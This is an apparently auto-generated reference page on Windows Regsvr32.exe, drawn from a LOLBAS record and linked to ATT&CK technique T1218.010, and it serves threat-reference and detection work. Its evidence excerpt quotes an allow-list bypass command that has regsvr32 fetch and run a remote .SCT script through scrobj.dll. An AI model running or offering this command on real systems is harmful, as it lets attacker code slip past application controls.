---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Regsvr32.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `regsvr32.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Regsvr32.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Used by Windows to register dlls

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/regsvr32.md)
- Source verification: [source record](../../sources/lolbas/regsvr32.exe.md)

## Aliases

- `Regsvr32.exe`
- `regsvr32.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1218.010 - Regsvr32](../../attack/techniques/T1218.010-regsvr32.md) | explicit | source | Command metadata lists T1218.010: regsvr32.exe /u /s {PATH:.dll} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/regsvr32.exe.md)

## Source Verification

[source record](../../sources/lolbas/regsvr32.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@subtee'
Person: Casey Smith
Author: Oddvar Moe
Commands:
- Category: AWL Bypass
Command: regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
Description: Execute the specified remote .SCT script with scrobj.dll.
```
